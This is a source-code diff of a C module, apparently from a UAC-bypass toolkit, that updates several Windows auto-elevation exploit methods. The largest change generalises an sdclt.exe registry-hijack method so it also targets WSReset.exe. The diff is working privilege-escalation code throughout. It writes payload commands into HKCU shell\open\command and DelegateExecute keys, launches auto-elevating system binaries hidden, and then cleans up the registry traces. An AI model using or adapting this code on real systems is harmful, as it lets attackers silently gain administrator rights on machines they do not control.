@@ -4,9 +4,9 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     3.13
+*  VERSION:     3.17
 *
-*  DATE:        25 Jan 2019
+*  DATE:        17 Mar 2019
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -20,6 +20,7 @@
 *  https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/
 *  https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
 *  http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
+*  https://www.activecyber.us/1/post/2019/03/windows-uac-bypass.html
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -48,7 +49,7 @@ BOOL ucmHijackShellCommandMethod(
     _In_opt_ DWORD ProxyDllSize
 )
 {
-    BOOL    bCond = FALSE, bResult = FALSE;
+    BOOL    bResult = FALSE;
     HKEY    hKey = NULL;
     LRESULT lResult;
     LPWSTR  lpBuffer = NULL;
@@ -127,7 +128,7 @@ BOOL ucmHijackShellCommandMethod(
 
         bResult = supRunProcess(lpszTargetApp, NULL);
 
-    } while (bCond);
+    } while (FALSE);
 
     if (lpBuffer != NULL)
         supHeapFree(lpBuffer);
@@ -150,7 +151,6 @@ DWORD ucmDiskCleanupWorkerThread(
     LPVOID Parameter
 )
 {
-    BOOL                        bCond = FALSE;
     NTSTATUS                    status;
     HANDLE                      hDirectory = NULL, hEvent = NULL;
     SIZE_T                      sz;
@@ -245,7 +245,7 @@ DWORD ucmDiskCleanupWorkerThread(
 
         } while (NT_SUCCESS(status));
 
-    } while (bCond);
+    } while (FALSE);
 
     if (usName.Buffer) {
         RtlFreeUnicodeString(&usName);
@@ -343,7 +343,7 @@ BOOL ucmAppPathMethod(
     _In_ LPWSTR lpszTargetApp
 )
 {
-    BOOL    bResult = FALSE, bCond = FALSE;
+    BOOL    bResult = FALSE;
     LRESULT lResult;
     HKEY    hKey = NULL;
     LPWSTR  lpKeyPath = NULL;
@@ -405,7 +405,7 @@ BOOL ucmAppPathMethod(
             RegDeleteKey(HKEY_CURRENT_USER, lpKeyPath);
         }
 
-    } while (bCond);
+    } while (FALSE);
 
     if (lpKeyPath != NULL)
         supHeapFree(lpKeyPath);
@@ -443,7 +443,7 @@ BOOL ucmSdcltIsolatedCommandMethod(
     _In_ LPWSTR lpszPayload
 )
 {
-    BOOL    bResult = FALSE, bCond = FALSE, bExist = FALSE;
+    BOOL    bResult = FALSE, bExist = FALSE;
     DWORD   cbData, cbOldData = 0;
     SIZE_T  sz = 0;
     LRESULT lResult;
@@ -524,7 +524,7 @@ BOOL ucmSdcltIsolatedCommandMethod(
             }
         }
 
-    } while (bCond);
+    } while (FALSE);
 
     if (hKey != NULL)
         RegCloseKey(hKey);
@@ -553,7 +553,7 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
     _In_ LPWSTR lpszPayload
 )
 {
-    BOOL    bResult = FALSE, bCond = FALSE;
+    BOOL    bResult = FALSE;
     DWORD   cbData;
     SIZE_T  sz = 0;
     LRESULT lResult;
@@ -572,7 +572,7 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
     if (g_ctx->IsWow64) {
         if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
             return FALSE;
-}
+    }
 #endif
 
     do {
@@ -637,7 +637,7 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
             supRegDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSSETTINGS);
         }
 
-    } while (bCond);
+    } while (FALSE);
 
     if (hKey != NULL)
         RegCloseKey(hKey);
@@ -652,23 +652,29 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
 }
 
 /*
-* ucmSdcltDelegateExecuteCommandMethod
+* ucmShellDelegateExecuteCommandMethod
 *
 * Purpose:
 *
 * Bypass UAC abusing COM entry hijack.
 * Original author link: http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
 *
-* Trigger: sdclt.exe without params
+* Targets:
+*            sdclt.exe without params for Emeric Nasi method
+*            WSReset.exe without params for Hashim Jawad method
 *
 */
-BOOL ucmSdcltDelegateExecuteCommandMethod(
-    _In_ LPWSTR lpszPayload
+BOOL ucmShellDelegateExecuteCommandMethod(
+    _In_ LPWSTR lpTargetApp,
+    _In_ SIZE_T cchTargetApp, //in chars, future use
+    _In_ LPWSTR lpTargetKey,
+    _In_ SIZE_T cchTargetKey, //in chars, future use
+    _In_ LPWSTR lpPayload,
+    _In_ SIZE_T cchPayload //in chars, future use
 )
 {
-    BOOL    bResult = FALSE, bCond = FALSE, bExist = FALSE;
-    DWORD   cbData, cbOldData = 0;
-    SIZE_T  sz = 0;
+    BOOL    bResult = FALSE, bExist = FALSE, bDelegateExecuteExist = FALSE;
+    DWORD   cbData, cbOldData = 0, cbOldDelegateData = 0, dwDisposition = 0;
     LRESULT lResult;
 #ifndef _WIN64
     PVOID   OldValue;
@@ -678,6 +684,7 @@ BOOL ucmSdcltDelegateExecuteCommandMethod(
 
     WCHAR szBuffer[MAX_PATH * 2];
     WCHAR szOldValue[MAX_PATH + 1];
+    WCHAR szOldDelegateExecute[MAX_PATH + 1];
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
@@ -687,13 +694,17 @@ BOOL ucmSdcltDelegateExecuteCommandMethod(
 #endif
 
     do {
+        if (cchPayload == 0)
+            return bResult;
+        if ((cchTargetApp >= MAX_PATH) || (cchTargetApp == 0))
+            return bResult;
+        if ((cchTargetKey >= MAX_PATH) || (cchTargetKey == 0))
+            return bResult;
 
-        sz = _strlen(lpszPayload);
-
-        _strcpy(szBuffer, T_CLASSESFOLDER);
+        _strcpy(szBuffer, lpTargetKey);
         _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
         lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szBuffer, 0, NULL,
-            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
+            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, &dwDisposition);
 
         if (lResult != ERROR_SUCCESS)
             break;
@@ -707,6 +718,16 @@ BOOL ucmSdcltDelegateExecuteCommandMethod(
             (BYTE*)szOldValue, &cbOldData);
         if (lResult == ERROR_SUCCESS)
             bExist = TRUE;
+
+        //
+        // Save old DelegateExecute value if exist.
+        //
+        cbOldDelegateData = MAX_PATH * 2;
+        RtlSecureZeroMemory(&szOldDelegateExecute, sizeof(szOldDelegateExecute));
+        lResult = RegQueryValueEx(hKey, T_DELEGATEEXECUTE, 0, NULL,
+            (BYTE*)szOldDelegateExecute, &cbOldDelegateData);
+        if (lResult == ERROR_SUCCESS)
+            bDelegateExecuteExist = TRUE;
 
         //
         // Set empty DelegateExecute value.
@@ -723,21 +744,24 @@ BOOL ucmSdcltDelegateExecuteCommandMethod(
         if (lResult != ERROR_SUCCESS)
             break;
 
-        cbData = (DWORD)((1 + sz) * sizeof(WCHAR));
+        cbData = (DWORD)((1 + cchPayload) * sizeof(WCHAR));
 
         lResult = RegSetValueEx(
             hKey,
             lpTargetValue,
             0, REG_SZ,
-            (BYTE*)lpszPayload,
+            (BYTE*)lpPayload,
             cbData);
 
         if (lResult == ERROR_SUCCESS) {
-            _strcpy(szBuffer, g_ctx->szSystemDirectory);
-            _strcat(szBuffer, SDCLT_EXE);
-            bResult = supRunProcess(szBuffer, NULL);
 
-            Sleep(10000); //wait a bit until this shell shit complete it internals
+            RegFlushKey(hKey);
+
+            _strcpy(szBuffer, g_ctx->szSystemDirectory);
+            _strcat(szBuffer, lpTargetApp);
+            bResult = supRunProcess2(szBuffer, NULL, NULL, SW_HIDE, TRUE);
+
+            Sleep(5000);  //wait a bit until this shell shit complete it internals
                           //not required if you don't cleanup or use reg.exe
 
             if (bExist == FALSE) {
@@ -745,7 +769,7 @@ BOOL ucmSdcltDelegateExecuteCommandMethod(
                 // We created this value, remove it.
                 //
                 RegDeleteValue(hKey, lpTargetValue);
-                
+
             }
             else {
                 //
@@ -756,12 +780,27 @@ BOOL ucmSdcltDelegateExecuteCommandMethod(
             }
         }
 
-        RegDeleteValue(hKey, T_DELEGATEEXECUTE);
+        //
+        // If DelegateExecute was before restore it else remove.
+        //
+        if (bDelegateExecuteExist) {
+            RegSetValueEx(hKey, T_DELEGATEEXECUTE, 0, REG_SZ,
+                (BYTE*)szOldDelegateExecute, cbOldDelegateData);
 
-    } while (bCond);
+        }
+        else {
+            RegDeleteValue(hKey, T_DELEGATEEXECUTE);
+        }
+
+    } while (FALSE);
 
     if (hKey != NULL)
         RegCloseKey(hKey);
+
+    if (dwDisposition == REG_CREATED_NEW_KEY) {
+        supRegDeleteKeyRecursive(HKEY_CURRENT_USER, lpTargetKey);
+    }
+
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
